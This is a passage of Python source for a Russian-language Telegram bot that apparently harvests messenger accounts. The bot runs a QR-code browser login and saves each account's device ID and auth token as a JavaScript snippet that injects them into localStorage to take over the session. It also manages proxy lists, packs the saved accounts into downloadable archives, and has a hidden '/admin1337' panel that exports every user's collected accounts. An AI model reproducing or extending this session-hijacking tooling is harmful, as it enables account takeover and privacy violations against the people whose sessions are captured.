        get_main_menu_text(callback.from_user.id),
        reply_markup=main_menu_kb(callback.from_user.id),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "menu_login")
async def handle_login(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    touch_user_profile(callback.from_user)
    await callback.answer("Запускаю авторизацию...")
    if user_id in user_sessions:
        await close_user_session(user_id)
        await callback.message.answer("Предыдущая браузерная сессия была сброшена.")

    proxy_entry = get_preferred_proxy(user_id)
    proxy_notice = (
        f"\n• <b>Прокси:</b> <code>{proxy_entry['display']}</code>"
        if proxy_entry else
        "\n• <b>Прокси:</b> не используется"
    )
    await callback.message.answer(
        "<b>Подготавливаю браузер</b>\n"
        f"Сейчас пришлю QR-код для входа.{proxy_notice}",
        parse_mode="HTML",
    )
    asyncio.create_task(login_process(user_id, callback.message, state))


@dp.callback_query(F.data.startswith("save_format_"), SaveFormat.waiting)
async def process_save_format(callback: CallbackQuery, state: FSMContext):
    touch_user_profile(callback.from_user)
    user_id = callback.from_user.id
    await callback.answer()
    data = user_temp_data.pop(user_id, None)
    if not data:
        await callback.message.edit_text(
            "<b>Временные данные не найдены.</b>\nПопробуйте выполнить вход заново.",
            reply_markup=main_menu_kb(user_id),
            parse_mode="HTML",
        )
        await state.clear()
        return

    ext = "txt" if callback.data == "save_format_txt" else "json"
    phone = data["phone"]
    device_id = data["device_id"]
    auth_data = data["auth_data"]

    file_path = get_accounts_dir(user_id) / f"{phone}.{ext}"
    js_string = (
        "sessionStorage.clear();"
        "localStorage.clear();"
        f"localStorage.setItem('__oneme_device_id','{device_id}');"
        f"localStorage.setItem('__oneme_auth','{auth_data}');"
        "window.location.reload();"
    )

    with open(file_path, "w", encoding="utf-8") as file:
        file.write(js_string)

    update_stats_on_login(user_id)
    await callback.message.edit_text(
        "<b>Аккаунт сохранен</b>\n\n"
        f"• <b>Телефон:</b> <code>{phone}</code>\n"
        f"• <b>Файл:</b> <code>{file_path.name}</code>\n"
        f"• <b>Формат:</b> <code>.{ext}</code>",
        reply_markup=main_menu_kb(user_id),
        parse_mode="HTML",
    )
    await state.clear()


@dp.callback_query(F.data == "menu_stats")
async def handle_stats(callback: CallbackQuery):
    touch_user_profile(callback.from_user)
    await callback.answer()
    await callback.message.edit_text(
        get_user_stats_text(callback.from_user.id),
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[make_button("⬅️ В меню", "menu_root", "primary")]]
        ),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "menu_proxy")
async def handle_proxy_menu(callback: CallbackQuery, state: FSMContext):
    touch_user_profile(callback.from_user)
    user_temp_data.pop(callback.from_user.id, None)
    await state.clear()
    await callback.answer()
    await callback.message.edit_text(
        get_proxy_menu_text(callback.from_user.id),
        reply_markup=proxy_menu_kb(),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "proxy_add")
async def handle_proxy_add(callback: CallbackQuery, state: FSMContext):
    touch_user_profile(callback.from_user)
    await callback.answer()
    await state.set_state(ProxyInput.waiting)
    await callback.message.edit_text(
        "<b>Добавление прокси</b>\n\n"
        "Отправьте одним сообщением один или несколько прокси, каждый с новой строки.\n\n"
        "Примеры:\n"
        "• <code>127.0.0.1:8080</code>\n"
        "• <code>127.0.0.1:8080:login:pass</code>\n"
        "• <code>http://login:pass@127.0.0.1:8080</code>\n"
        "• <code>socks5://127.0.0.1:9050</code>",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[make_button("⬅️ Назад к прокси", "menu_proxy", "primary")]]
        ),
        parse_mode="HTML",
    )


@dp.message(ProxyInput.waiting)
async def save_proxy_list(message: types.Message, state: FSMContext):
    touch_user_profile(message.from_user)
    raw_lines = [line.strip() for line in (message.text or "").splitlines() if line.strip()]
    if not raw_lines:
        await message.answer(
            "Не получил ни одной строки с прокси. Отправьте список еще раз.",
            parse_mode="HTML",
        )
        return

    valid_entries: list[dict] = []
    invalid_entries: list[str] = []
    seen: set[str] = set()

    for raw_line in raw_lines:
        try:
            parsed = parse_proxy_line(raw_line)
        except ValueError as exc:
            invalid_entries.append(f"{raw_line} ({exc})")
            continue

        if parsed["raw"] in seen:
            continue
        seen.add(parsed["raw"])
        valid_entries.append(parsed)

    if not valid_entries:
        await message.answer(
            "<b>Ни один прокси не удалось сохранить.</b>\nПроверьте формат и отправьте список снова.",
            parse_mode="HTML",
        )
        return

    save_user_proxies(message.from_user.id, valid_entries)
    await state.clear()

    invalid_preview = ""
    if invalid_entries:
        preview = "\n".join(f"• <code>{item[:120]}</code>" for item in invalid_entries[:5])
        invalid_preview = f"\n\n<b>Пропущены строки</b>\n{preview}"

    await message.answer(
        "<b>Прокси сохранены</b>\n\n"
        f"• <b>Сохранено:</b> <code>{len(valid_entries)}</code>\n"
        f"• <b>Пропущено:</b> <code>{len(invalid_entries)}</code>"
        f"{invalid_preview}",
        reply_markup=proxy_menu_kb(),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "proxy_validate")
async def handle_proxy_validate(callback: CallbackQuery):
    touch_user_profile(callback.from_user)
    stats = get_proxy_stats(callback.from_user.id)
    if stats["total"] == 0:
        await callback.answer()
        await callback.message.edit_text(
            "<b>Список прокси пуст.</b>\nСначала добавьте хотя бы один прокси.",
            reply_markup=proxy_menu_kb(),
            parse_mode="HTML",
        )
        return

    await callback.answer()
    await callback.message.edit_text(
        "<b>Проверяю прокси</b>\nЭто может занять немного времени, особенно если список большой.",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[make_button("⬅️ В меню", "menu_root", "primary")]]
        ),
        parse_mode="HTML",
    )

    result = await validate_user_proxies(callback.from_user.id)
    valid_list = [proxy["display"] for proxy in result["items"] if proxy.get("is_valid")][:3]
    invalid_list = [
        f"{proxy['display']} ({proxy.get('error') or 'ошибка'})"
        for proxy in result["items"]
        if proxy.get("is_valid") is False
    ][:3]

    extra_lines = ""
    if valid_list:
        extra_lines += "\n\n<b>Первые валидные</b>\n" + "\n".join(
            f"• <code>{item}</code>" for item in valid_list
        )
    if invalid_list:
        extra_lines += "\n\n<b>Первые невалидные</b>\n" + "\n".join(
            f"• <code>{item[:140]}</code>" for item in invalid_list
        )

    await callback.message.edit_text(
        "<b>Проверка завершена</b>\n\n"
        f"• <b>Всего прокси:</b> <code>{result['total']}</code>\n"
        f"• <b>Валидных:</b> <code>{result['valid']}</code>\n"
        f"• <b>Невалидных:</b> <code>{result['invalid']}</code>"
        f"{extra_lines}",
        reply_markup=proxy_menu_kb(),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "proxy_clear")
async def handle_proxy_clear(callback: CallbackQuery, state: FSMContext):
    touch_user_profile(callback.from_user)
    clear_user_proxies(callback.from_user.id)
    await state.clear()
    await callback.answer("Прокси очищены.")
    await callback.message.edit_text(
        "<b>Список прокси очищен.</b>",
        reply_markup=proxy_menu_kb(),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "menu_export")
async def handle_export_menu(callback: CallbackQuery):
    touch_user_profile(callback.from_user)
    await callback.answer()
    await callback.message.edit_text(
        "<b>Выгрузка базы</b>\n\nВыберите, какие данные нужно упаковать в архив.",
        reply_markup=export_menu_kb(),
        parse_mode="HTML",
    )


@dp.callback_query(F.data.startswith("export_"))
async def process_export(callback: CallbackQuery):
    touch_user_profile(callback.from_user)
    user_id = callback.from_user.id
    await callback.answer()

    today_only = callback.data == "export_today"
    zip_path = create_user_export_archive(user_id, today_only=today_only, include_meta=False)
    if not zip_path:
        await callback.message.edit_text(
            "<b>Для выбранного периода нет данных.</b>",
            reply_markup=export_menu_kb(),
            parse_mode="HTML",
        )
        return

    try:
        update_stats_on_export(user_id)
        await callback.message.edit_text(
            "<b>Архив готов</b>\nОтправляю файл в этот чат...",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[[make_button("⬅️ В меню", "menu_root", "primary")]]
            ),
            parse_mode="HTML",
        )
        await bot.send_document(
            user_id,
            FSInputFile(zip_path),
            caption="Ваша выгрузка базы готова.",
        )
    finally:
        if zip_path.exists():
            zip_path.unlink()


@dp.callback_query(F.data == "menu_clear")
async def handle_clear_start(callback: CallbackQuery, state: FSMContext):
    touch_user_profile(callback.from_user)
    user_id = callback.from_user.id
    stats = load_stats(user_id)
    if stats["total"] == 0 and not get_account_files(user_id):
        await callback.answer()
        await callback.message.edit_text(
            "<b>База уже пуста.</b>",
            reply_markup=main_menu_kb(user_id),
            parse_mode="HTML",
        )
        return

    today_files = get_account_files(user_id, today_only=True)
    if today_files:
        backup_path = create_user_export_archive(user_id, today_only=True, include_meta=False)
        if backup_path:
            try:
                await callback.message.answer_document(
                    FSInputFile(backup_path),
                    caption="Автоматический бэкап сегодняшних файлов перед очисткой.",
                )
            finally:
                if backup_path.exists():
                    backup_path.unlink()

    await callback.answer()
    await callback.message.edit_text(
        "<b>Очистка базы</b>\n\n"
        "Сейчас будет удалена вся ваша локальная база аккаунтов.\n"
        "Для безопасности подтверждение разбито на два шага.",
        reply_markup=clear_confirm_step_1_kb(),
        parse_mode="HTML",
    )
    await state.set_state(ClearConfirm.first)


@dp.callback_query(F.data == "clear_confirm_1", ClearConfirm.first)
async def clear_confirm_first(callback: CallbackQuery, state: FSMContext):
    touch_user_profile(callback.from_user)
    await callback.answer()
    await callback.message.edit_text(
        "<b>Последнее предупреждение</b>\n\n"
        "После этого шага файлы аккаунтов будут удалены без возможности восстановления из бота.",
        reply_markup=clear_confirm_step_2_kb(),
        parse_mode="HTML",
    )
    await state.set_state(ClearConfirm.second)


@dp.callback_query(F.data == "clear_confirm_2", ClearConfirm.second)
async def clear_confirm_second(callback: CallbackQuery, state: FSMContext):
    touch_user_profile(callback.from_user)
    user_id = callback.from_user.id
    await callback.answer()

    acc_dir = get_existing_accounts_dir(user_id)
    count = 0
    if acc_dir.exists():
        for path in acc_dir.glob("*.*"):
            if path.is_file():
                path.unlink()
                count += 1

    await callback.message.edit_text(
        f"<b>Очистка завершена</b>\nУдалено файлов: <code>{count}</code>",
        reply_markup=main_menu_kb(user_id),
        parse_mode="HTML",
    )
    await state.clear()


@dp.callback_query(F.data == "noop")
async def handle_noop(callback: CallbackQuery):
    await callback.answer()


# ---------- Admin handlers ----------
async def deny_admin_access(target_message: types.Message | None, callback: CallbackQuery | None = None):
    if callback:
        await callback.answer("Недостаточно прав.", show_alert=True)
    if target_message:
        await target_message.answer(
            "<b>Доступ запрещен.</b>\nЭта панель доступна только главному администратору.",
            parse_mode="HTML",
        )


@dp.message(Command("admin1337"))
async def cmd_admin(message: types.Message):
    touch_user_profile(message.from_user)
    if not is_main_admin(message.from_user.id):
        await deny_admin_access(message)
        return

    await message.answer(
        get_admin_panel_text(),
        reply_markup=admin_menu_kb(),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "admin_root")
async def admin_root(callback: CallbackQuery):
    touch_user_profile(callback.from_user)
    if not is_main_admin(callback.from_user.id):
        await deny_admin_access(None, callback)
        return

    await callback.answer()
    await callback.message.edit_text(
        get_admin_panel_text(),
        reply_markup=admin_menu_kb(),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    touch_user_profile(callback.from_user)
    if not is_main_admin(callback.from_user.id):
        await deny_admin_access(None, callback)
        return

    overview = get_global_snapshot()
    latest = sorted(
        overview["snapshots"],
        key=lambda item: item["last_activity"] or 0,
        reverse=True,
    )[:5]
    latest_lines = "\n".join(
        f"• <code>{item['user_id']}</code> — {get_display_name(item['user_id'])} — {format_dt(item['last_activity'])}"
        for item in latest
    ) or "• Нет активности"

    await callback.answer()
    await callback.message.edit_text(
        "<b>Общая статистика бота</b>\n\n"
        f"• <b>Пользователей:</b> <code>{overview['users']}</code>\n"
        f"• <b>Аккаунтов:</b> <code>{overview['accounts']}</code>\n"
        f"• <b>Сохранено сегодня:</b> <code>{overview['today']}</code>\n"
        f"• <b>Суммарных выгрузок:</b> <code>{overview['exports']}</code>\n"
        f"• <b>Размер данных:</b> <code>{format_size(overview['size'])}</code>\n\n"
        "<b>Последняя активность</b>\n"
        f"{latest_lines}",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[make_button("⬅️ В админку", "admin_root", "primary")]]
        ),
        parse_mode="HTML",
    )


@dp.callback_query(F.data.startswith("admin_users_page_"))
async def admin_users_page(callback: CallbackQuery):
    touch_user_profile(callback.from_user)
    if not is_main_admin(callback.from_user.id):
        await deny_admin_access(None, callback)
        return

    page = int(callback.data.rsplit("_", 1)[1])
    await callback.answer()
    await callback.message.edit_text(
        get_admin_users_text(page),
        reply_markup=admin_users_kb(page),
        parse_mode="HTML",
    )


@dp.callback_query(F.data.startswith("admin_user_"))
async def admin_user_router(callback: CallbackQuery):
    touch_user_profile(callback.from_user)
    if not is_main_admin(callback.from_user.id):
        await deny_admin_access(None, callback)
        return

    parts = callback.data.split("_")
    if len(parts) < 4:
        await callback.answer("Некорректное действие.", show_alert=True)
        return

    if len(parts) == 4:
        action = "card"
        user_id = int(parts[2])
        page = int(parts[3])
    else:
        action = parts[2]
        user_id = int(parts[3])
        page = int(parts[4]) if len(parts) > 4 else 0

    if action == "stats":
        await callback.answer()
        await callback.message.edit_text(
            get_admin_user_stats_text(user_id),
            reply_markup=admin_user_stats_kb(user_id, page),
            parse_mode="HTML",
        )
        return

    if action == "export":
        await callback.answer()
        zip_path = create_full_user_archive(user_id)
        if not zip_path:
            await callback.message.answer(
                f"Не удалось сформировать архив пользователя <code>{user_id}</code>.",
                parse_mode="HTML",
            )
            return

        try:
            await bot.send_document(
                callback.from_user.id,
                FSInputFile(zip_path),
                caption=f"Полная выгрузка данных пользователя {user_id}.",
            )
            await callback.message.answer(
                f"Архив пользователя <code>{user_id}</code> отправлен.",
                parse_mode="HTML",
            )
        finally:
            if zip_path.exists():
                zip_path.unlink()
        return

    if action != "card":
        await callback.answer("Неизвестное действие.", show_alert=True)
        return

    await callback.answer()
    await callback.message.edit_text(
        get_admin_user_card_text(user_id),
        reply_markup=admin_user_card_kb(user_id, page),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "admin_export_all")
async def admin_export_all(callback: CallbackQuery):
    touch_user_profile(callback.from_user)
    if not is_main_admin(callback.from_user.id):
        await deny_admin_access(None, callback)
        return

    await callback.answer()
    zip_path = create_all_users_archive()
    if not zip_path:
        await callback.message.answer(
            "<b>Нет данных для общей выгрузки.</b>",
            parse_mode="HTML",
        )
        return

    try:
        await bot.send_document(
            callback.from_user.id,
            FSInputFile(zip_path),
            caption="Полная выгрузка всех пользователей готова.",
        )
        await callback.message.answer(
            "<b>Архив со всеми пользователями отправлен.</b>",
            parse_mode="HTML",
        )
    finally:
        if zip_path.exists():
            zip_path.unlink()


# ---------- Run ----------
async def main():
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot)
    finally:
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())
